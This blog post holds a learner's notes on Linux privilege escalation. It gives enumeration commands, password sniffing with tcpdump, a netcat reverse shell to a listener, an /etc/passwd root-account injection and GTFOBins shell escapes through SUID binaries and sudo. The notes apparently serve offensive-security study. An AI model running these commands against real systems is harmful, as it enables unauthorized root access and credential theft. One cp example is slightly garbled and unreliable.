---
layout: post
title: Linux Auto Privilege Escalation
titledate: 09/17/23
tags: ["infosec", "info_gathering", "offsec", "privesc"]
---

#### automating enumeration

we can use the tool /usr/bin/unix-privesc-check on our box to look for system misconfiguration

we can try both standard and detailed mode - copy the script over the system and dump it to a file

    ./unix-privesc-check standard > output.txt

some other tools that can check linux systems are LinEnum and LinPeas

check history and user env

    $ history

    $ env

    $ cat ~/.bashrc or .bash_profile or .zshrc or .zprofile etc

crunch is a quite powerful world list generator

try sudo su

    $ sudo -l

list privs

    $ sudo -i 

execute as root

we can observe running processes even if run as root 

    $ watch -n 1 "ps -aux | grep pass"

tcpdump can be useful in capturing any attempted network communication, in this example we try to look for the word pass

    $ sudo tcpdump -i lo -A | grep "pass"

we can inspect the cron log file /var/log/cron.log

    $ grep "CRON" /var/log/syslog

sometimes we can gain access to scripts that execute with higher privs and insert our own code like a shell 1liner 

if using kali to capture a linux nc connection can connect with something like 

our script 

    nc 192.168.1.1 4444 -e /bin/sh

then on our attacking machine

    msf > use/multi/handler
    set our options 
    set payload cmd/unix/reverse_netcat

passwords can be found in /etc/passwd or /etc/shadow but if found in /etc/passwd take priority

if we can write to /etc/passwd we can create a passwd for any user

we can generate a password

    $ openssl passwd pass

then add our new account to /etc/passwd

    $ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

then we can switch user to that account

    $ su root2

to change  user password 
    
    $ passwd

to get the pid of the passwd process

    $ ps u -C passwd

check the pid UID

    $ grep Uid /proc/(x)/status

if the passwd binary or any binary has the setUID flag or SUID set

    $ ls -asl /usr/bin/passwd

    s - will show the owner as root

in this example the find application has the suid set

    $ find /home/user/Desktop -exec "/usr/bin/bash" -p \;

so if we run it with the exec arg it will execute as root

we can run getcap to look for these binaries

    $ /usr/sbin/getcap -r / 2>/dev/null

https://gtfobins.github.io contains unix binaries that can exploit privesc vulns

for example, if our search above discloses perl as having capabilities setuid set we can search for perl on gtfobins

    $ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

and the above is an example of how it canbe used to execute a shell

this cmd can enumerate binaries with stuid flag set

### find / -xdev -user root \( -perm -4000 -o -perm -2000 \)

in this example i see the cp binary has the s flag set so gtfobins shows us we can utilize that to copy files from write protected locations like /root/... to our file

for the example i did

    $ TF=/root/flag.txt
    $ $ /usr/bin/cp $TF $LFILE

now we could apply something similar in this case to all files since cp will run with root privs

#### sudo misconfigurations

we can list the services we can run sudo with

    $ sudo -l

can approach attacks similar to the above with setuid

for example running the above command gives sudo privs for gcc

and gtfobins tells us

    $ sudo gcc -wrapper /bin/sh,-s .

examine the kernel and architecture

    $ uname -r
    $ arch

once we have a kernel version we can use searchsploit to try to identify known vulns

    $ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"